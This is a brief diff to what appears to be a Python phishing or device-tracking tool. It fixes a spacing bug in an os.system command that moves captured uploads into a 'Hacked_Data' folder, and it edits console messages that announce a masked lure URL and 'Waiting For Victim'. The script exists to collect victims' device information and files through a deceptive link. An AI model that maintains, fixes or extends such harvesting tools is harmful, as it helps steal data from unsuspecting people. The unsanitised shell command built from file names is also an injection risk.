@@ -366,7 +366,7 @@ def get_log():
             elif (head == "details_"):
                 data = open(".server/upload/data.json").read().replace("[", "").replace("]", "")
                 print_details(data)
-            os.system("mv .server/upload/*"+exte+"/sdcard/Hacked_Data/"+head+body+exte)
+            os.system("mv .server/upload/*"+exte+" /sdcard/Hacked_Data/"+head+body+exte)
             
 
 
@@ -466,7 +466,7 @@ def alert_panel(url = "", mask = ""):
         print("\n\033[92m\033[94m[\033[37m*\033[94m]\033[92m URL 2 : \033[37m"+masked_url)
     if (menu.method == "about_device"):
         print("\n\033[92m\033[94m[\033[37m+\033[94m]\033[92m Use a VPN To Get Extra Device Informations...")
-    print("\n\033[92m\033[94m[\033[37m*\033[94m]\033[92m All Your Data is Saved In \033[37mHacked_Data \033[92mFolder")
+    print("\n\033[92m\033[94m[\033[37m*\033[94m]\033[92m All Your Data is Saved In Your Storage's' \033[37mHacked_Data \033[92mFolder")
     print("\n\033[92m\033[94m[\033[37m*\033[94m]\033[92m Waiting For Victim, Press \033[37mCtrl + c \033[92mto Exit....")
     time.sleep(1)
     while True:
